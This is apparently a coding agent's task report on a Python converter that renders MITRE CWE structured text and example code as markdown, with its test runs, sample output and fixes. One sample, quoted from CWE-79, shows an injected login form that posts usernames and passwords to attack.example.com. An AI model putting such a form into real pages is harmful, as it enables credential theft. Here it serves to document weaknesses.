# Task 2 report: structured text to markdown

## Implemented
`weakness/mitre.org/cwe/scripts/cwe_structured_text.py` (stdlib only): `UnsupportedMarkupError`, `structured_text_to_md`, `example_code_to_md`, `escape_inline(text, at_line_start=True)`, `escape_table_cell`, `fence`.
- Prose: walks text/children/tails in order; whitespace collapsed; `p`/`div` blocks; `ul`/`ol` (nested, tight); tables (header row when first row is all `th`, else an empty header row; `colspan` pads; caption becomes an italic line; `br` in a cell becomes `<br>`); `b`/`i` to `**`/`*` (edge whitespace moved outside); `sup` to `<sup>`; monospace `span` to an inline code span; `img` to `![alt](abs-url)`; `br` to a two-space hard break. Escaping is applied per text segment, with line-initial escapes only where the segment really starts a line.
- Code: `br` = newline; 4 spaces per nested `div` with `margin-left`; XML pretty-print whitespace dropped; plain-text code dedented when it begins with a newline; `b`/`i`/`span`/`sup` plain; nothing escaped; fence grows past backtick runs.
- Label: `*Example (Bad, PHP):*` (Nature, then Language), `*Example (Attack):*` without Language, `*Example:*` with neither. Label and fence are separated by one blank line. Language tag lower-cased and sanitised to one token (`x86 Assembly` -> `x86-assembly`).
- Example_Code holding `p`/`ul`/`ol`/`table` (44 in 5.0) renders as prose under the label, not as a fence.
- Any other tag, block-in-inline, or stray `li`/`tr`/`td` raises `UnsupportedMarkupError` with the context.

## TDD
RED: `python3 -m unittest discover -s weakness/mitre.org/cwe/scripts/tests -v`
-> `ModuleNotFoundError: No module named 'cwe_structured_text'` ... `Ran 1 test ... FAILED (errors=1)`
GREEN (after implementing and fixing two bugs found by my own tests: leading-indent loss on first code line; space lost after `</i>`): same command -> `Ran 16 tests in 1.170s  OK`.
Real-data tests (both zips, every structured element incl. all Example_Code) pass; they skip if the git-ignored zips are absent.

## Files
- weakness/mitre.org/cwe/scripts/cwe_structured_text.py
- weakness/mitre.org/cwe/scripts/tests/test_cwe_structured_text.py

## Real output
CWE-79 "Result" example (4.19.1):

    *Example (Result):*

    ```
    <div class="header"> Welcome, <div id="stealPassword"> Please Login:
        <form name="input" action="attack.example.com/stealPassword.php" method="post">
            Username: <input type="text" name="username" /><br/>
            Password: <input type="password" name="password" /><br/>
            <input type="submit" value="Login" />
        </form>
    </div></div>
    ```

A table (5.0, no `th` in source, so empty header row):

    | System Address | Mapped to |  <- shown as first body row under an empty header:
    |  |  |
    | --- | --- |
    | System Address | Mapped to |
    | 0x0000 - 0x3FFF | Unit_A registers : 0x0000 - 0x0FFF |
    | 0x4000 - 0xFFFF | Other IPs & Memory |

A list (5.0):

    Targeted technologies include, but are not necessarily limited to:

    - automated speech recognition
    - automated image recognition
    - automated cyber defense
    - chatbots, LLMs, generative AI

## Self-review / concerns
- Tables with no `th` get an empty header row (markdown needs one); I did not promote the first row, to avoid misstating the source.
- Example_Code languages `Other`, `Pseudocode` etc. produce fence tags `other`, `pseudocode` as the brief says.
- ElementTree is stdlib and not hardened against XXE; inputs are MITRE's SHA-pinned zips (a security hook flagged this; stdlib-only is a constraint).
- Ambiguity choices: label/fence separated by a blank line; hard break is two trailing spaces; dedent only when code text starts with a newline.
- Real-data scan of 5.0 output found no stray `**` spacing problems, no empty code fences, no tabs in prose.

## Fix round (review of f4bdd605)
Changed (cwe_structured_text.py): (1) code dedent whenever a segment starts with a newline, and of lines[1:] otherwise; (2) caption no longer escaped twice; (3) `_TABLE_PARTS` is `{tbody}` only (thead/tfoot now fail); (T2-a) `p` in Example_Code is a block inside a fence, only a table/list switches to structured output; (T2-b) `*` and backtick always escaped, `_` escaped unless between two alphanumerics, backslash before punctuation doubled, line-initial `=` escaped; (T2-c) prose `br` is a trailing backslash hard break, repeated/trailing breaks dropped.
New tests: caption escaped once, thead unsupported, CWE-102-shape pretty-printed dedent, multi-line segment without leading newline, p-only fenced, CWE-1236 Attack fenced, CWE-1220 table example structured, CWE-190 keeps `nresp\*sizeof(char\*)`, escaping cases (snake_case, _emphasis_, `====`), real-data check (both editions) that no fenced code line starts with a tab or has an indent that is not a multiple of 4.
Command: `python3 -m unittest discover -s weakness/mitre.org/cwe/scripts/tests -v` -> `Ran 26 tests ... OK`.
Check: with the old module restored the new tests fail (see run output in the session); restored the fixed module afterwards.
